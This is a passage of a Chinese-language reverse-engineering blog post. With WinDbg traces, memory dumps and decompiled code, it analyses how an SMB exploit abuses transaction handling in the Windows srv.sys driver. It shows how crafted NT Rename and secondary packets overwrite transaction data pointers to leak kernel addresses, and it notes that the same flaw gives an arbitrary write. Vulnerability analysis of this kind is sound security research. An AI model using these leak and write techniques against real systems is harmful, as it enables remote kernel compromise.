<p><img src="./images/1504518930349.jpg" alt></p>
<ol start="3">
<li>收到SRV global data pointer</li>
</ol>
<p><img src="./images/1504519080082.jpg" alt></p>
<ol start="4">
<li>发了很多尝试包，都是两个两个发的，下面这个是泄露那个table的最后一个包</li>
</ol>
<p><img src="./images/1504520475512.jpg" alt></p>
<ol start="5">
<li>收到这个包就确定了table的地址，应该是根据这个table前面有很多0xfe，还有table中后面两个函数指针是保留指针，所以地址是一样的，猜测是这样判断的</li>
</ol>
<p><img src="./images/1504520667712.jpg" alt></p>
<p>6.最后就是判断读写执行的内存的返回包，其实后来调试他是在寻找nt!KxUnexpectedInterrupt0，这个地址就是RWX地址</p>
<p><img src="./images/1504520702197.jpg" alt="返回包"></p>
<h1 id="信息泄露原理"><a href="#信息泄露原理" class="headerlink" title="信息泄露原理"></a>信息泄露原理</h1><h2 id="原理简述"><a href="#原理简述" class="headerlink" title="原理简述"></a>原理简述</h2><p>这里面用了两种信息泄露的点</p>
<ol>
<li><p>发送nt rename包，在RestartTransactionResponse的时候利用下面的这一句覆盖另一个transaction的OutData指针，这个用于泄露CONNECTION地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memmove(pNtRenameParameters, (const void *)(*(_QWORD *)(transaction + 0x88) + dataDisplacement), DataCount);// 0x88偏移为out Data</span><br></pre></td></tr></table></figure>
</li>
<li><p>第二种是利用SrvSmbTransactionSecondary下面这句，泄露其他地址</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">memmove(</span><br><span class="line">      (void *)(*(_QWORD *)(v8 + 0x80) + DataDisplacementCopy),// 0x80偏移是InData指针</span><br><span class="line">      (const void *)(smbTotalDataCopy + DataoffsetCopy),</span><br><span class="line">      DataCount);</span><br></pre></td></tr></table></figure>

<p>其实我觉得别的文章说的类型混淆，可能找transaction的时候找到的是WriteAndX的，实际上更重要的是dataDisplacement的偏移，而且数据包中很多利用的MID都是0，应该只有两次是利用了WriteAndX同样的MID</p>
<p><img src="./images/1505371872435.jpg" alt></p>
<p><strong>既然可以覆盖OutData指针，那么也可以覆盖InData指针，就可以达到任意地址写的目的了</strong></p>
<h2 id="通过SrvFindTransaction看信息泄露"><a href="#通过SrvFindTransaction看信息泄露" class="headerlink" title="通过SrvFindTransaction看信息泄露"></a>通过SrvFindTransaction看信息泄露</h2><p>下断点 <code>bp SrvFindTransaction+0xbb &quot;r r15;dq rsi+0xc0;gc&quot;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">.......</span><br><span class="line">r15=0000000000000000</span><br><span class="line">fffff8a0`02b65330  00000000`000087f4 00000000`00000000</span><br><span class="line">fffff8a0`02b65340  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02b65350  00000000`00010101 00000000`00000000</span><br><span class="line">fffff8a0`02b65360  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02b65370  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02b65380  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02b65390  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02b653a0  00000000`00000000 00000000`00000000</span><br><span class="line">r15=0000000000000000</span><br><span class="line">fffff8a0`02b8b330  00000000`000087f5 00000000`00000000</span><br><span class="line">fffff8a0`02b8b340  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02b8b350  00000000`00010101 00000000`00000000</span><br><span class="line">fffff8a0`02b8b360  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02b8b370  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02b8b380  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02b8b390  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02b8b3a0  00000000`00000000 00000000`00000000</span><br><span class="line">r15=0000000000000000</span><br><span class="line">fffff8a0`02ba1330  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02ba1340  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02ba1350  00000000`00010101 00000000`00000000</span><br><span class="line">fffff8a0`02ba1360  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02ba1370  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02ba1380  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02ba1390  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02ba13a0  00000000`00000000 00000000`00000000</span><br><span class="line">kd&gt; dq fffff8a0`02ba1330-0xc0</span><br><span class="line">fffff8a0`02ba1270  00000000`0d8c020c fffffa80`1e25e810</span><br><span class="line">fffff8a0`02ba1280  fffffa80`1d4d5910 fffff8a0`02d41750</span><br><span class="line">fffff8a0`02ba1290  fffff8a0`01c20dd0 fffff8a0`02bd0298</span><br><span class="line">fffff8a0`02ba12a0  fffff8a0`02b8b298 00000000`00000000</span><br><span class="line">fffff8a0`02ba12b0  00000000`00020000 fffff8a0`02ba1368</span><br><span class="line">fffff8a0`02ba12c0  00000001`0004a0b5 00000000`00000000</span><br><span class="line">fffff8a0`02ba12d0  fffff8a0`02ba136c 00000000`00000000</span><br><span class="line">fffff8a0`02ba12e0  fffff8a0`02ba136c fffff8a0`02ba13ac</span><br><span class="line">kd&gt; dq fffff8a0`02ba1330-0xc0+0x80</span><br><span class="line">fffff8a0`02ba12f0  fffff8a0`02b4e170 fffff8a0`02ba1ffc</span><br><span class="line">fffff8a0`02ba1300  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02ba1310  00000004`00000c50 00000000`00001000</span><br><span class="line">fffff8a0`02ba1320  00000101`00000000 08032155`08030000</span><br><span class="line">fffff8a0`02ba1330  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02ba1340  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`02ba1350  00000000`00010101 00000000`00000000</span><br><span class="line">fffff8a0`02ba1360  00000000`00000000 00000000`00000000</span><br></pre></td></tr></table></figure>

<p> 那么可以看到 <code>fffff8a002b4e170+ 0x88 = fffff8a002b4e1f8</code></p>
<p> 这个地址就是被利用的地址（即fffff8a002ba1270地址这个transaction的InData指针的加一个偏移后，覆盖了另一个transaction的OutData指针，从而达到信息泄露的目的），0x88为Data Displacement</p>
<h2 id="泄露CONNECTION地址"><a href="#泄露CONNECTION地址" class="headerlink" title="泄露CONNECTION地址"></a>泄露CONNECTION地址</h2><p>在这一句已经开始发送泄露的数据包，去泄露CONNECTION的地址</p>
<p><img src="./images/1504577758229.jpg" alt></p>
<p>数据包如下：（可以看到是NT RENAME的trans数据包）</p>
<p><img src="./images/1504577830572.jpg" alt></p>
<h3 id="处理第一个包"><a href="#处理第一个包" class="headerlink" title="处理第一个包"></a>处理第一个包</h3><p>接下来就会进入srv!SrvSmbNtRename函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">srv!SrvSmbNtRename:</span><br><span class="line">fffff880`05073818 48895c2410      mov     qword ptr [rsp+10h],rbx</span><br><span class="line">kd&gt; kv</span><br><span class="line">Child-SP          RetAddr           : Args to Child                                                           : Call Site</span><br><span class="line">fffff880`0337f978 fffff880`05048801 : fffff800`00000005 fffff880`0337fa49 00000000`00000002 fffff880`050018ef : srv!SrvSmbNtRename</span><br><span class="line">fffff880`0337f980 fffff880`0504e041 : 00000000`00000001 fffff880`0337fa49 fffffa80`1d495240 fffff8a0`02c4210c : srv!ExecuteTransaction+0x401</span><br><span class="line">fffff880`0337f9d0 fffff880`050039a0 : 00000000`00000001 fffffa80`00003f40 fffffa80`000010c0 fffff880`00000004 : srv!SrvSmbNtTransaction+0x6a9</span><br><span class="line">fffff880`0337fab0 fffff880`05003607 : fffffa80`1d49a750 fffffa80`1d4d4b90 fffffa80`1d49b1d0 fffff880`0501a158 : srv!SrvProcessSmb+0x230</span><br><span class="line">fffff880`0337fb20 fffff880`05043572 : fffffa80`1d48a600 fffffa80`1d49a750 00000000`00000000 fffffa80`1d49a760 : srv!SrvRestartReceive+0x10f</span><br><span class="line">fffff880`0337fb60 fffff800`1afb1e3e : fffff8a0`017ab0a0 fffffa80`1d48a600 00000000`00000080 fffffa80`1d45fdf0 : srv! ?? ::NNGAKEGL::`string&apos;+0x42ef</span><br><span class="line">fffff880`0337fbe0 fffff800`1ac40521 : fffffa80`18d49040 fffff8a0`017ab0a0 fffff8a0`01b0e478 fffff8a0`00308a70 : nt!IopThreadStart+0x26</span><br><span class="line">fffff880`0337fc10 fffff800`1ac7edd6 : fffff800`1af14180 fffffa80`18d49040 fffffa80`1d48e040 fffffa80`18c5f980 : nt!PspSystemThreadStartup+0x59</span><br><span class="line">fffff880`0337fc60 00000000`00000000 : fffff880`03380000 fffff880`0337a000 00000000`00000000 00000000`00000000 : nt!KxStartSystemThread+0x1</span><br></pre></td></tr></table></figure>

<p>这函数是从工具程序和数据包联合启发而找到的</p>
<p><img src="./images/1504578213807.jpg" alt></p>
<p>SrvSmbNtRename函数在SrvNtTransactionDispatchTable中，通过偏移调用实现的</p>
<p><img src="./images/1504578289540.jpg" alt></p>
<p>接下来我们动态跟踪</p>
<p>里面对FID进行Verify</p>
<p><img src="./images/1504579026389.jpg" alt></p>
<p>返回值为0xfffffa801dfb39d0（那是某一次调试记录），之后函数就返回了</p>
<p>整个流程如下</p>
<p><img src="./images/1504579304216.jpg" alt></p>
<p>出来后进入这个</p>
<p><img src="./images/1504579434311.jpg" alt></p>
<p>跟数据包中下面这个是相关的</p>
<p><img src="./images/1504579504963.jpg" alt></p>
<p>最后在SrvCompleteExecuteTransaction调用SrvStartSend返回smb数据包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; p</span><br><span class="line">srv!ExecuteTransaction+0x7a9:</span><br><span class="line">fffff880`05048ba9 e832000000      call    srv!SrvCompleteExecuteTransaction (fffff880`05048be0)</span><br><span class="line">kd&gt; bp  SrvStartSend2</span><br><span class="line">kd&gt; bp  SrvStartSend</span><br><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 5 hit</span><br><span class="line">srv!SrvStartSend:</span><br><span class="line">fffff880`0500dd20 48895c2408      mov     qword ptr [rsp+8],rbx</span><br><span class="line">kd&gt; dc poi(rcx+0xc0) </span><br><span class="line">fffffa80`1d495220  424d53ff 000000a0 c0039800 00000000  .SMB............</span><br><span class="line">fffffa80`1d495230  00000000 00000000 8d790800 fb910800  ..........y.....</span><br><span class="line">fffffa80`1d495240  00000012 00000004 000010c0 00000004  ................</span><br><span class="line">fffffa80`1d495250  00000048 00000000 000010b8 0000004c  H...........L...</span><br><span class="line">fffffa80`1d495260  00000000 0010bd00 77c04000 068450ca  .........@.w.P..</span><br><span class="line">fffffa80`1d495270  0b13c8fb 6db02c36 ef97c0ff 2550ed2b  ....6,.m....+.P%</span><br><span class="line">fffffa80`1d495280  c0a10aee 5572a1c6 125825c1 654704c3  ......rU.%X...Ge</span><br><span class="line">fffffa80`1d495290  f05286d3 fbd127f2 14eb5b49 ab2613ad  ..R..&apos;..I[....&amp;.</span><br></pre></td></tr></table></figure>

<p>还有一个问题没弄明白的就是rename的数据到底有什么用，暂时猜测只是填充</p>
<p><img src="./images/1504579981211.jpg" alt></p>
<h3 id="处理第二个包secondary包"><a href="#处理第二个包secondary包" class="headerlink" title="处理第二个包secondary包"></a>处理第二个包secondary包</h3><p>由于是Nt trans 的包，所以调用的是srv!SrvSmbNtTransactionSecondary</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 3 hit</span><br><span class="line">srv!SrvSmbNtTransactionSecondary:</span><br><span class="line">fffff880`0507db34 fff3            push    rbx</span><br><span class="line">kd&gt; kv</span><br><span class="line">Child-SP          RetAddr           : Args to Child                                                           : Call Site</span><br><span class="line">fffff880`0337faa8 fffff880`050039a0 : 00000000`00000001 fffffa80`00003f40 fffffa80`19b36010 fffff880`05007f5a : srv!SrvSmbNtTransactionSecondary</span><br><span class="line">fffff880`0337fab0 fffff880`05003607 : fffffa80`1d499360 fffffa80`1d4d4b90 fffffa80`1d499de0 fffff880`0501a158 : srv!SrvProcessSmb+0x230</span><br><span class="line">fffff880`0337fb20 fffff880`05043572 : fffffa80`1d48a600 fffffa80`1d499360 00000000`00000000 fffffa80`1d499370 : srv!SrvRestartReceive+0x10f</span><br><span class="line">fffff880`0337fb60 fffff800`1afb1e3e : fffff8a0`017ab0a0 fffffa80`1d48a600 00000000`00000080 fffffa80`1d45fdf0 : srv! ?? ::NNGAKEGL::`string&apos;+0x42ef</span><br><span class="line">fffff880`0337fbe0 fffff800`1ac40521 : fffffa80`18d49040 fffff8a0`017ab0a0 fffff8a0`01b0e478 fffff8a0`00308a70 : nt!IopThreadStart+0x26</span><br><span class="line">fffff880`0337fc10 fffff800`1ac7edd6 : fffff800`1af14180 fffffa80`18d49040 fffffa80`1d48e040 fffffa80`18c5f980 : nt!PspSystemThreadStartup+0x59</span><br><span class="line">fffff880`0337fc60 00000000`00000000 : fffff880`03380000 fffff880`0337a000 00000000`00000000 00000000`00000000 : nt!KxStartSystemThread+0x16</span><br></pre></td></tr></table></figure>

<p><img src="./images/1504581895913.jpg" alt></p>
<p>在下面这条赋值中发现上面截图中数据包中的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; p</span><br><span class="line">srv!SrvSmbNtTransactionSecondary+0x18:</span><br><span class="line">fffff880`0507db4c 488b99c8000000  mov     rbx,qword ptr [rcx+0C8h]</span><br><span class="line">kd&gt; db poi(rcx+0C8)+28</span><br><span class="line">fffffa80`1d4910d8  ca 50 84 06 fb c8 13 0b-36 2c b0 6d ff c0 97 ef  .P......6,.m....</span><br><span class="line">fffffa80`1d4910e8  2b ed 50 25 ee 0a a1 c0-c6 a1 72 55 c1 25 58 12  +.P%......rU.%X.</span><br><span class="line">fffffa80`1d4910f8  c3 04 47 65 d3 86 52 f0-f2 27 d1 fb 49 5b eb 14  ..Ge..R..&apos;..I[..</span><br><span class="line">fffffa80`1d491108  ad 13 26 ab db 9d db c7-2c fa a3 19 b9 04 10 ca  ..&amp;.....,.......</span><br><span class="line">fffffa80`1d491118  0d 94 74 59 db 8b 6f 59-ae 27 a6 d6 92 5f 53 82  ..tY..oY.&apos;..._S.</span><br><span class="line">fffffa80`1d491128  4c b1 bf b8 61 53 7d 15-ca 91 e3 59 36 7c 0d 23  L...aS&#125;....Y6|.#</span><br><span class="line">fffffa80`1d491138  aa 0a 7f f6 4e b4 9c 90-bd af c8 14 18 eb 79 e2  ....N.........y.</span><br><span class="line">fffffa80`1d491148  3f af f0 48 55 14 c1 83-da ca 34 61 6c 05 1f 19  ?..HU.....4al...</span><br></pre></td></tr></table></figure>

<p>下面调用SrvFindTransaction，找到了，返回了0xfffff8a002c42010</p>
<p><img src="./images/1504589052075.jpg" alt></p>
<p>出了SrvFindTransaction函数调试到下面</p>
<p>根据数值和数据包可以大胆猜测偏移0x10的是Parameter Offset，0x1c的是Data Offset</p>
<p><img src="./images/1504592000749.jpg" alt></p>
<p><img src="./images/1504590250998.jpg" alt></p>
<p>下面就进入memmove那里了<br>由于ParameterCount为0，就只进入第二个memmove那里了</p>
<p><img src="./images/1504592246735.jpg" alt></p>
<p><img src="./images/1504592213821.jpg" alt></p>
<p>先看一下参数，复制的大小是DataCount的值0x150，目标是fffff8a002c46050</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; p</span><br><span class="line">srv!SrvSmbNtTransactionSecondary+0x2fe:</span><br><span class="line">fffff880`0507de32 e8093af8ff      call    srv!memmove (fffff880`05001840)</span><br><span class="line">kd&gt; r rcx </span><br><span class="line">rcx=fffff8a002c46050</span><br><span class="line">kd&gt; r rdx</span><br><span class="line">rdx=fffffa801d4910d8</span><br><span class="line">kd&gt; r r8</span><br><span class="line">r8=0000000000000150</span><br></pre></td></tr></table></figure>

<p>目标地址是第一次trans Request的数据（这样会被覆盖吧）</p>
<p><img src="./images/1504592785456.jpg" alt></p>
<p>那么这里DataDisplacementCopy为0，导致覆盖了前一个transaction的InData指向的地址</p>
<p><img src="./images/1504593063378.jpg" alt></p>
<p>但是发现其实前150个字节是一样的，汗~</p>
<p><img src="./images/1504593551481.jpg" alt></p>
<p>接下来对对应的transaction的对应字段加上相应的值</p>
<p><img src="./images/1504593862816.jpg" alt></p>
<p>到这其实有个问题，就是实际上transaction的数据并没有增大，这个datacout应该是虚增了，但看不出什么问题</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fffff880`<span class="number">0507d</span>eb6 <span class="number">4401</span>b<span class="number">6a4000000</span>  add     dword ptr [rsi+<span class="number">0</span>A4h],r14d ds:<span class="number">002</span>b:fffff8a0`<span class="number">02c420b4</span>=<span class="number">000010c0</span></span><br><span class="line">fffff880`<span class="number">0507d</span>ebd <span class="number">4401</span>be<span class="number">98000000</span>  add     dword ptr [rsi+<span class="number">98h</span>],r15d ds:<span class="number">002</span>b:fffff8a0`<span class="number">02c420a8</span>=<span class="number">00000004</span></span><br></pre></td></tr></table></figure>

<p>再下面就到了SrvDereferenceConnection，没进入if，直接出来了</p>
<p><img src="./images/1504595007843.jpg" alt></p>
<p>SrvSmbNtTransactionSecondary出来了就到了SrvEndSmbProcessing</p>
<p><img src="./images/1504596549363.jpg" alt></p>
<p>一次偶然发现第一次nt response和第二次的nt response内存中的地址是一样的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 5 hit</span><br><span class="line">srv!SrvStartSend:</span><br><span class="line">fffff880`0500dd20 48895c2408      mov     qword ptr [rsp+8],rbx</span><br><span class="line">kd&gt; dc poi(rcx+0xc0) l50</span><br><span class="line">fffffa80`1d495220  424d53ff 000000a0 c0039800 00000000  .SMB............</span><br><span class="line">fffffa80`1d495230  00000000 00000000 741b0802 29e10802  ...........t...)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">srv!SrvStartSend2:</span><br><span class="line">fffff880`05003b20 48895c2408      mov     qword ptr [rsp+8],rbx</span><br><span class="line">kd&gt; dc poi(rcx+0xc0) l50</span><br><span class="line">fffffa80`1d495220  424d53ff 000000a0 c0039800 00000000  .SMB............</span><br></pre></td></tr></table></figure>

<p>所以我在获取了第一次的地址后，对c0偏移位置下写入断点就好了，果然断下来了，原来调用了RestartTransactionResponse函数</p>
<p><img src="./images/1504669412649.jpg" alt></p>
<p>再一步步跟原来调用了RestartTransactionResponse函数，终于找到点子上了</p>
<p>首先将第一个response包的DataCount给到一个局部变量，这个局部变量其实就是下面要用到的dataDisplacement</p>
<p><img src="./images/1504685900798.jpg" alt></p>
<p>之后便是一些赋值，计算操作（这个对整个分析的理解是很重要的，当然这个过程我也结合了数据包中的数据）</p>
<p><img src="./images/1504686039167.jpg" alt></p>
<p>接下来就将第一次的nt response的OutData再偏移dataDisplacement（0x10b8）</p>
<p><img src="./images/1504686558569.jpg" alt></p>
<p>看看复制的源地址是什么，这个地址刚好是第一次nt response的OutData的后面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dq poi(rbx+88)+10b8 l21</span><br><span class="line">fffff8a0`02836108  bfbce2e1`834ca2db 00000000`00000000</span><br><span class="line">fffff8a0`02836118  00000000`00000000 67617246`03020100</span><br><span class="line">fffff8a0`02836128  00000000`00000000 00000000`00005120</span><br><span class="line">fffff8a0`02836138  00000000`00000000 65657246`00010102</span><br><span class="line">fffff8a0`02836148  00000000`00000000 7274534c`03eb0101</span><br><span class="line">fffff8a0`02836158  fffff880`00969ff0 00000000`00000e8c</span><br><span class="line">fffff8a0`02836168  00000000`00000000 00000000`0e8c020c</span><br><span class="line">fffff8a0`02836178  fffffa80`1ddcc4d0 fffffa80`1d4d2b90</span><br><span class="line">fffff8a0`02836188  fffff8a0`01bd8a90 fffff8a0`02a9b650</span><br><span class="line">fffff8a0`02836198  fffff8a0`02268048 fffff8a0`02831038</span><br><span class="line">fffff8a0`028361a8  00000000`00000000 00000000`00020000</span><br><span class="line">fffff8a0`028361b8  fffff8a0`02836268 ffffffff`000061ea</span><br><span class="line">fffff8a0`028361c8  00000000`00000000 fffff8a0`0283626c</span><br><span class="line">fffff8a0`028361d8  00000000`00000000 fffff8a0`0283626c</span><br><span class="line">fffff8a0`028361e8  fffff8a0`028362fc fffff8a0`0283626c</span><br><span class="line">fffff8a0`028361f8  fffff8a0`02836ffc 00000000`00000000</span><br><span class="line">fffff8a0`02836208  00000000`00000000</span><br></pre></td></tr></table></figure>

<p>这里我们看到了熟悉的<code>fffffa801d4d2b90</code>，这个就是CONNECTION结构地址</p>
<p>再看看这个地址有什么符号，我们看到了srv!SrvGlobalSpinLocks+0x70，这个应该就是SRV global data pointer</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dqs fffffa80`1d4d2b90</span><br><span class="line">fffffa80`1d4d2b90  00000016`04700202</span><br><span class="line">fffffa80`1d4d2b98  00000000`00000000</span><br><span class="line">fffffa80`1d4d2ba0  00000000`00000000</span><br><span class="line">fffffa80`1d4d2ba8  00000000`00000000</span><br><span class="line">fffffa80`1d4d2bb0  00000000`00000000</span><br><span class="line">fffffa80`1d4d2bb8  00000000`00000000</span><br><span class="line">fffffa80`1d4d2bc0  00000000`00000000</span><br><span class="line">fffffa80`1d4d2bc8  fffff880`0501af50 srv!SrvGlobalSpinLocks+0x70</span><br><span class="line">fffffa80`1d4d2bd0  fffffa80`1d48a600</span><br><span class="line">fffffa80`1d4d2bd8  00000000`ffffffed</span><br><span class="line">fffffa80`1d4d2be0  fffffa80`1a590990</span><br><span class="line">fffffa80`1d4d2be8  80010000`00004000</span><br><span class="line">fffffa80`1d4d2bf0  00000000`00000001</span><br><span class="line">fffffa80`1d4d2bf8  fffffa80`1d4d1dd0</span><br><span class="line">fffffa80`1d4d2c00  fffffa80`1d4a7040</span><br><span class="line">fffffa80`1d4d2c08  fffffa80`1d48a600</span><br></pre></td></tr></table></figure>

<h2 id="泄露-SRV-global-data-pointer"><a href="#泄露-SRV-global-data-pointer" class="headerlink" title="泄露 SRV global data pointer"></a>泄露 SRV global data pointer</h2><p>经过一番调试，费了一上午，突然想到，既然已经知道CONNECTION的地址了，那么我对CONNECTION的那个偏移下读取断点不就行了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp srv!RestartTransactionResponse+0x288 &quot;dqs poi(rdx+78);ba r8 poi(rdx+78)+38&quot;</span><br></pre></td></tr></table></figure>

<p>由于ba r8 poi(rdx+78)+38这个断点断了很多，最后断到了memmove，结果一时手快，直接g，错过了</p>
<p>后来还是辛苦的断了下来，原来是SrvCompleteExecuteTransaction调用的memmove</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 11 hit</span><br><span class="line">srv!SrvFsdRequeueReceiveWorkItem+0xab:</span><br><span class="line">fffff880`05002e6b 408af0          mov     sil,al</span><br><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 11 hit</span><br><span class="line">srv!SrvFsdRequeueReceiveWorkItem+0xe6:</span><br><span class="line">fffff880`05002ea6 8b4704          mov     eax,dword ptr [rdi+4]</span><br><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 11 hit</span><br><span class="line">srv!SrvFsdRequeueReceiveWorkItem+0xab:</span><br><span class="line">fffff880`05002e6b 408af0          mov     sil,al</span><br><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 11 hit</span><br><span class="line">srv!SrvFsdRequeueReceiveWorkItem+0xe6:</span><br><span class="line">fffff880`05002ea6 8b4704          mov     eax,dword ptr [rdi+4]</span><br><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 11 hit</span><br><span class="line">srv!memmove+0x1c5:</span><br><span class="line">fffff880`05001a05 4883e908        sub     rcx,8</span><br><span class="line">kd&gt; kv</span><br><span class="line">Child-SP          RetAddr           : Args to Child                                                           : Call Site</span><br><span class="line">fffff880`05ee8ad8 fffff880`05049013 : fffffa80`1d48a648 00000000`0000000f 00000000`00000000 00000000`00000001 : srv!memmove+0x1c5</span><br><span class="line">fffff880`05ee8ae0 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : srv!SrvCompleteExecuteTransaction+0x433</span><br></pre></td></tr></table></figure>

<p>可以再下个断点确认一下</p>
